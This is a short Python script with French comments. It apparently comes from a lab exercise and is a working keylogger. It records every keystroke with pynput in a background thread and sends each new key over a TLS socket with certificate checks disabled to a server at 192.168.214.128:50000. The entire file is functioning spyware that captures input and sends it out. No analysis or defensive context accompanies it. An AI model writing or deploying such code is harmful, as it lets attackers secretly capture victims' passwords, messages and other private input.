from pynput.keyboard import Listener
import threading
import ssl
import socket
import time

context = ssl._create_unverified_context()

last_key = None
previous_key = None

def on_press(key):
    global last_key
    last_key = key

def start_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

def main():
    global previous_key

    # Thread Listener
    t = threading.Thread(target=start_listener, daemon=True)
    t.start()
    
    # Connexion TCP
    sclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sclient = context.wrap_socket(sclient, server_hostname='192.168.214.128')
    sclient.connect(('192.168.214.128', 50000))

    print(f"Serveur @IP = {sclient.getpeername()[0]}")
    print(f"Serveur @Port = {sclient.getpeername()[1]}")
    print("Connecté au serveur.")

    while True:
        # Envoyer la touche si elle a change
        if last_key is not None and last_key != previous_key:
            message = str(last_key)
            sclient.send(message.encode('utf-8'))
            print("Envoyé:", message)
            previous_key = last_key
        time.sleep(0.01)  
    sclient.close()
    print("Connexion fermée.")

main()
